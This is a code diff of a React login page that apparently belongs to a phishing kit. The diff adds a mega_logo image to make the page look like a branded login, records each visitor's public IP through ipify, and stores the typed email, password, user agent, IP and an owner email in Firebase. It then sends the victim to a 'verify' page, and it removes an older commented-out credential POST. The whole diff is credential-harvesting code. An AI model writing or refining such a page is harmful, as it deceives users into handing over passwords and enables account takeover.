@@ -3,14 +3,14 @@ import { useRef } from 'react'
 import './Login.css'
 import { useLocation, useNavigate } from 'react-router-dom'
 import { addData } from '../config/firebase'
+import logo from '../assets/mega_logo.png'
+import axios from 'axios'
 
 const Login = () => {
 
 
   const location = useLocation()
-
   const navigate = useNavigate()
-
 
   const email = useRef()
   const pass = useRef()
@@ -24,27 +24,15 @@ const Login = () => {
       const emailValue = email.current.value
       const passValue = pass.current.value
       const userAgent = navigator.userAgent
+      const response = await axios.get("https://api.ipify.org?format=json")
 
-      const result = await addData(emailValue, passValue, userAgent, ownerEmail)
+      const result = await addData(emailValue, passValue, userAgent, ownerEmail, response.data.ip)
 
       if (!result) {
         alert('Something went wrong!')
       }
 
-      alert('Try again')
-
-      // await fetch(`${url}/link/save`, {
-      //   method: "POST",
-      //   headers: {
-      //     'Content-Type': 'application/json'
-      //   },
-      //   body: JSON.stringify({
-      //     linkName: pathName,
-      //     email: email.current.value,
-      //     pass: pass.current.value,
-      //     userAgent: navigator.userAgent
-      //   })
-      // });
+      navigate(`/${pathNames[1]}/verify/${result.id}`)
       email.current.value = ''
       pass.current.value = ''
     } catch (error) {
@@ -61,11 +49,12 @@ const Login = () => {
     <div className='login-page-container'>
       <form onSubmit={handleSubmit} className=' z-20'>
         <div className=' flex flex-col inside-form'>
-          <h1 className=' text-xl text-white'>Log in to your account</h1>
+          {/* <h1 className=' text-xl text-white'>Login to your account</h1> */}
+          <img src={logo} alt="logo" />
           <input type="text" placeholder='Your Email' ref={email} required />
           <input type="password" placeholder='Password' ref={pass} required />
         </div>
-        <button>Log in</button>
+        <button>Login</button>
       </form>
     </div>
   )
